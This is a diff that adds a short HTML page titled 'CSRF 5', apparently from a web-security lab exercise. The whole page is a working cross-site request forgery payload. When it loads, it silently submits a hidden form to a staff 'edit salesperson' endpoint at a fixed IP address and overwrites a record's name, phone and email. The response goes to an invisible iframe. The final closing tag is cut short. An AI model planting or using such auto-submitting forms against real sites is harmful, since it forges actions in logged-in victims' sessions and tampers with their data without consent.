@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF 5</title>
+  </head>
+  <body onload="document.edit_salesperson.submit()">
+    <form action="https://107.178.208.193/red/public/staff/salespeople/edit.php?id=1" method="POST" name="edit_salesperson" style="display: none;" target="hidden_results">
+      <input type="text" name="first_name" value="Kenny"><br>
+      <input type="text" name="last_name" value="Tan"><br>
+      <input type="text" name="phone" value="432-432-4321"><br>
+      <input type="text" name="email" value="Kenny@gmail.com"><br>
+    </form>
+    <iframe name="hidden_results" style="display: none;"></iframe>
+  </body>
+</html
